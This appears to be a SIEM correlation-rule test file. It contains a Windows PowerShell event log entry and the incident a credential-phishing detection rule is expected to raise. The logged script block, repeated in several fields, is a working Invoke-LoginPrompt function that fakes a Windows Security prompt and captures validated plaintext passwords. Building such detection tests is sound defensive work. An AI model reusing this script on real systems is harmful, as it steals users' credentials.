{"action": "execute", "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-PowerShell\",\"Guid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\"},\"EventID\":\"4104\",\"Version\":\"1\",\"Level\":\"3\",\"Task\":\"2\",\"Opcode\":\"15\",\"Keywords\":\"0x0\",\"TimeCreated\":{\"SystemTime\":\"2019-09-09T13:35:09.3152300Z\"},\"EventRecordID\":\"1123\",\"Correlation\":{\"ActivityID\":\"{b5abe6c2-675c-0001-a601-acb55c67d501}\"},\"Execution\":{\"ProcessID\":\"5500\",\"ThreadID\":\"356\"},\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"MSEDGEWIN10\",\"Security\":{\"UserID\":\"S-1-5-21-3461203602-4096304019-2269080069-1000\"}},\"EventData\":{\"Data\":[{\"Name\":\"MessageNumber\",\"text\":\"1\"},{\"Name\":\"MessageTotal\",\"text\":\"1\"},{\"Name\":\"ScriptBlockText\",\"text\":\"function Invoke-LoginPrompt{ $cred = $Host.ui.PromptForCredential(\\\"Windows Security\\\", \\\"Please enter user credentials\\\", \\\"$env:userdomain\\\\$env:username\\\",\\\"\\\") $username = \\\"$env:username\\\" $domain = \\\"$env:userdomain\\\" $full = \\\"$domain\\\" + \\\"\\\\\\\" + \\\"$username\\\" $password = $cred.GetNetworkCredential().password Add-Type -assemblyname System.DirectoryServices.AccountManagement $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) while($DS.ValidateCredentials(\\\"$full\\\",\\\"$password\\\") -ne $True){ $cred = $Host.ui.PromptForCredential(\\\"Windows Security\\\", \\\"Invalid Credentials, Please try again\\\", \\\"$env:userdomain\\\\$env:username\\\",\\\"\\\") $username = \\\"$env:username\\\" $domain = \\\"$env:userdomain\\\" $full = \\\"$domain\\\" + \\\"\\\\\\\" + \\\"$username\\\" $password = $cred.GetNetworkCredential().password Add-Type -assemblyname System.DirectoryServices.AccountManagement $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) $DS.ValidateCredentials(\\\"$full\\\", \\\"$password\\\") | out-null } $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password $output R{START_PROCESS} } Invoke-LoginPrompt\"},{\"Name\":\"ScriptBlockId\",\"text\":\"c7ca7056-b317-4fff-b796-05d8ef896dcd\"},{\"Name\":\"Path\"}]}}}", "category.generic": "Command", "category.high": "System Management", "category.low": "Manipulation", "event_src.category": "Operating system", "event_src.fqdn": "msedgewin10", "event_src.host": "msedgewin10", "event_src.hostname": "msedgewin10", "event_src.subsys": "Microsoft-Windows-PowerShell/Operational", "event_src.title": "windows", "event_src.vendor": "microsoft", "generator.type": "logcollector", "generator.version": "N26.0.2936", "id": "PT_Microsoft_Windows_eventlog_Common_PowerShell_4104_Command_executed", "importance": "info", "input_id": "00000000-0000-0000-0000-000000000000", "mime": "application/x-pt-eventlog", "msgid": "4104", "normalized": true, "numfield1": 1, "numfield2": 1, "object": "command", "object.account.id": "S-1-5-21-3461203602-4096304019-2269080069-1000", "object.id": "c7ca7056-b317-4fff-b796-05d8ef896dcd", "object.process.cmdline": "function Invoke-LoginPrompt{ $cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Please enter user credentials\", \"$env:userdomain\\$env:username\",\"\") $username = \"$env:username\" $domain = \"$env:userdomain\" $full = \"$domain\" + \"\\\" + \"$username\" $password = $cred.GetNetworkCredential().password Add-Type -assemblyname System.DirectoryServices.AccountManagement $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) while($DS.ValidateCredentials(\"$full\",\"$password\") -ne $True){ $cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Invalid Credentials, Please try again\", \"$env:userdomain\\$env:username\",\"\") $username = \"$env:username\" $domain = \"$env:userdomain\" $full = \"$domain\" + \"\\\" + \"$username\" $password = $cred.GetNetworkCredential().password Add-Type -assemblyname System.DirectoryServices.AccountManagement $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) $DS.ValidateCredentials(\"$full\", \"$password\") | out-null } $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password $output R{START_PROCESS} } Invoke-LoginPrompt", "object.process.id": "5500", "object.value": "function Invoke-LoginPrompt{ $cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Please enter user credentials\", \"$env:userdomain\\$env:username\",\"\") $username = \"$env:username\" $domain = \"$env:userdomain\" $full = \"$domain\" + \"\\\" + \"$username\" $password = $cred.GetNetworkCredential().password Add-Type -assemblyname System.DirectoryServices.AccountManagement $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) while($DS.ValidateCredentials(\"$full\",\"$password\") -ne $True){ $cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Invalid Credentials, Please try again\", \"$env:userdomain\\$env:username\",\"\") $username = \"$env:username\" $domain = \"$env:userdomain\" $full = \"$domain\" + \"\\\" + \"$username\" $password = $cred.GetNetworkCredential().password Add-Type -assemblyname System.DirectoryServices.AccountManagement $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) $DS.ValidateCredentials(\"$full\", \"$password\") | out-null } $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password $output R{START_PROCESS} } Invoke-LoginPrompt", "recv_ipv4": "127.0.0.1", "recv_time": "2023-06-17T11:06:31.317Z", "status": "success", "subject": "account", "subject.account.id": "S-1-5-21-3461203602-4096304019-2269080069-1000", "tag": "some_tag", "task_id": "00000000-0000-0000-0000-000000000000", "taxonomy_version": "26.0.215-release-26.0", "time": "2019-09-09T13:35:09.315Z", "type": "raw", "uuid": "baac7d95-1a5c-4dfb-892d-e6dee90ffb79"}

# Тут будет твой тест. В секции expect укажи сколько и каких корреляционных событий ты ожидаешь
expect 1 								{"action": "execute", "category.generic": "Attack", "category.high": "Credential Access", "category.low": "Input Capture: GUI Input Capture", "correlation_name": "Phishing_windows_credentials_powershell_scriptblock", "correlation_type": "incident", "event_src.category": "Operating system", "event_src.fqdn": "msedgewin10", "event_src.host": "msedgewin10", "event_src.hostname": "msedgewin10", "event_src.subsys": "Microsoft-Windows-PowerShell/Operational", "event_src.title": "windows", "event_src.vendor": "microsoft", "importance": "high", "incident.aggregation.key": "Phishing_windows_credentials_powershell_scriptblock|msedgewin10|function Invoke-LoginPrompt{ $cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Please enter user credentials\", \"$env:userdomain\\$env:username\",\"\") $username = \"$env:username\" $domain = \"$env:userdomain\" $full = \"$domain\" + \"\\\" + \"$username\" $password = $cred.GetNetworkCredential().password Add-Type -assemblyname System.DirectoryServices.AccountManagement $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) while($DS.ValidateCredentials(\"$full\",\"$password\") -ne $True){ $cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Invalid Credentials, Please try again\", \"$env:userdomain\\$env:username\",\"\") $username = \"$env:username\" $domain = \"$env:userdomain\" $full = \"$domain\" + \"\\\" + \"$username\" $password = $cred.GetNetworkCredential().password Add-Type -assemblyname System.DirectoryServices.AccountManagement $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) $DS.ValidateCredentials(\"$full\", \"$password\") | out-null } $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password $output R{START_PROCESS} } Invoke-LoginPrompt", "incident.aggregation.timeout": 7200, "incident.category": "Undefined", "incident.severity": "high", "object": "command", "object.account.id": "S-1-5-21-3461203602-4096304019-2269080069-1000", "object.process.cmdline": "function Invoke-LoginPrompt{ $cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Please enter user credentials\", \"$env:userdomain\\$env:username\",\"\") $username = \"$env:username\" $domain = \"$env:userdomain\" $full = \"$domain\" + \"\\\" + \"$username\" $password = $cred.GetNetworkCredential().password Add-Type -assemblyname System.DirectoryServices.AccountManagement $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) while($DS.ValidateCredentials(\"$full\",\"$password\") -ne $True){ $cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Invalid Credentials, Please try again\", \"$env:userdomain\\$env:username\",\"\") $username = \"$env:username\" $domain = \"$env:userdomain\" $full = \"$domain\" + \"\\\" + \"$username\" $password = $cred.GetNetworkCredential().password Add-Type -assemblyname System.DirectoryServices.AccountManagement $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) $DS.ValidateCredentials(\"$full\", \"$password\") | out-null } $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password $output R{START_PROCESS} } Invoke-LoginPrompt", "object.value": "function Invoke-LoginPrompt{ $cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Please enter user credentials\", \"$env:userdomain\\$env:username\",\"\") $username = \"$env:username\" $domain = \"$env:userdomain\" $full = \"$domain\" + \"\\\" + \"$username\" $password = $cred.GetNetworkCredential().password Add-Type -assemblyname System.DirectoryServices.AccountManagement $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) while($DS.ValidateCredentials(\"$full\",\"$password\") -ne $True){ $cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Invalid Credentials, Please try again\", \"$env:userdomain\\$env:username\",\"\") $username = \"$env:username\" $domain = \"$env:userdomain\" $full = \"$domain\" + \"\\\" + \"$username\" $password = $cred.GetNetworkCredential().password Add-Type -assemblyname System.DirectoryServices.AccountManagement $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) $DS.ValidateCredentials(\"$full\", \"$password\") | out-null } $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password $output R{START_PROCESS} } Invoke-LoginPrompt", "status": "success", "subject": "account", "subject.account.id": "S-1-5-21-3461203602-4096304019-2269080069-1000"}
